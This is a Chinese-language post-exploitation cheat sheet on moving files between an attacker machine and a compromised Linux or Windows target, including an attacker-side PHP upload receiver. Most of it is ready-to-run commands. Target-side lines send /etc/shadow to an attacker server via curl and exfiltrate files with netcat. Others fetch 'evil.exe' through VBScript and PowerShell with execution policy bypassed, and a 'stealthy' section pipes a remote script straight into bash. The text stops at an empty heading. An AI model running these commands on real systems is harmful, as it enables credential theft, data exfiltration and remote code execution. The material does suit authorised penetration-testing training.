---
description: 在目标系统中已经成功建立立足点后，需要传输一些脚本到目标系统中，以实现后续的提权操作
---

# ✔️ Linux文件传输 - Linux File Transfers

## 常规方式

### 利用Python传输：

```bash
// Attacker
python3 -m http.server 8888
```

```bash
// Target
wget http://攻方IP:8888/利用脚本.sh
chmod +x 利用脚本.sh
利用脚本.sh
```

### 利用Apache2传输：

```
// Attacker
1. 准备好upload.php文件，放在/var/www/html目录下；
2. 同时在/var/www/html目录下再创建一个/uploads目录，用于存放稍后从目标系统中传回的敏感文件；
```

```bash
// Target
curl --form "uploadedfile=@/etc/shadow" http://攻方IP/upload.php
```

```php
// upload.php
<?php  
$target_path = "uploads/";
$target_path = $target_path.basename($_FILES['uploadedfile']['name']);

echo "Source=".$_FILES['uploadedfile']['name']."<br/>";
echo "Target path=".$target_path."<br/>";
echo "Size=".$_FILES['uploadedfile']['size']."<br/>";

if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)){
	echo "The file".basename($_FILES['uploadedfile']['name'])."has been uploaded";
}else{
	echo "There was an error uploading the file,please try again!"
}

?>
```

### 利用Netcat传输

```bash
// Attacker
nc -lvp 1234 > 传回的文件名 
```

```bash
// Target
nc 攻方IP 1234 < 待传回的文件名
```

### 利用FTP传输

#### 方法1：

```bash
// Attacker
sudo python3 -m pyftpdlib  -p 21 -w
python -m pyftpdlib -p 21
```

```bash
// Target
ftp -A 攻方IP
dir               # 查找要传到目标上的程序，本例为：winPEAS.exe
get winPEAS.exe
bye
```

#### 方法2：

```bash
// Attacker
cp /usr/share/.../nc.exe /ftphome/
systemcrl restart pure-ftpd
```

```bash
// Target
echo open 攻方IP >> ftp.txt
echo USER 用户名 >> ftp.txt
echo 密码 >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

// 执行ftp.txt
ftp -v -n -s:ftp.txt
```

### 利用SCP传输

使用 SCP（Secure Copy Protocol）在 Linux 系统中进行文件传输时，实际上是在通过 SSH 连接进行加密传输。

```bash
// 格式
scp 待传输文件的路径 目标用户命@目标IP:传输后保存的路径
scp /path/to/local/file username@remote_host:/path/to/destination
```

#### 将文件上传到目标主机

```bash
// Attacker
scp example.txt username@remote_host:/home/username/
scp /path/to/local/file username@remote_host:/path/to/destination
```

* `/path/to/local/file`：本地系统上要传输的文件的路径
* `username`：远程系统上的用户名
* `remote_host`：远程系统的主机名或 IP 地址
* `/path/to/destination`：远程系统上存储文件的目标路径

#### 将目标主机中的文件下载到本地

```bash
// Attacker
scp username@remote_host:/path/to/remote/file /path/to/local/destination
scp username@remote_host:/home/username/example.txt /path/to/local/destination
```

* `/path/to/local/file`：本地系统上要传输的文件的路径
* `username`：远程系统上的用户名
* `remote_host`：远程系统的主机名或 IP 地址
* `/path/to/destination`：远程系统上存储文件的目标路径

### SCP + SSH

若已经配置了 SSH 密钥认证，则可以免去输入密码的步骤。在执行 SCP 命令时，系统会自动使用 SSH 密钥进行认证。









### 利用SMB客户端传输

前提条件：**已安装smbclient**

```bash
// 格式：
smbclient //server_ip/share_name -U username
```

启动了一个 SMB 服务器，允许其他设备通过 SMB 协议与之通信，并在本地文件系统的当前目录下共享文件（本例为 "liodeus"）：

```bash
// Attacker
sudo smbserver.py -smb2support liodeus .
```

```bash
// Target
smbclient //攻方IP/liodeus -U 用户名
// 连接成功后，查找对应文件，并下载到目标本机中(本例为 "liodeus")：
ls
get liodeus
// 还可以从目标机器里上传文件到攻方SMB服务器：
put 文件名
quit
```

### 利用VBScript传输

该脚本适用于VBScript：Windows XP / Windows 2003&#x20;

```powershell
// Target
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

<pre class="language-powershell"><code class="lang-powershell">// Target
<strong>cscript wget.vbs http://攻方IP/evil.exe evil.exe
</strong></code></pre>

该脚本适用于Powershell：Windows 7 / Windows 2008 / 及以上版本

```powershell
// Target
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://攻方IP/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

// 设置wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

// 执行wget.ps1
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://攻方IP/evil.exe', 'new-exploit.exe')
```

* `powershell.exe`: 启动 PowerShell 解释器。
* `-ExecutionPolicy Bypass`: 设置脚本执行策略为 Bypass，即绕过执行策略限制，允许执行未签名的脚本。
* `-NoLogo`: 执行时不显示 PowerShell 的启动标志。
* `-NonInteractive`: 设置为非交互模式，即不会提示用户进行任何交互操作。
* `-NoProfile`: 在执行过程中不加载 PowerShell 用户配置文件。
* `-File wget.ps1`: 指定要执行的 PowerShell 脚本文件，这里假设文件名为 wget.ps1。

## 隐蔽方式

### 方法1：

```bash
// Attacker
python3 -m http.server 8888
```

```
// Target
curl http://攻方IP:8888/利用脚本.sh | bash
```

MEMO：该利用脚本不会被保存在目标系统中

### 方法2：

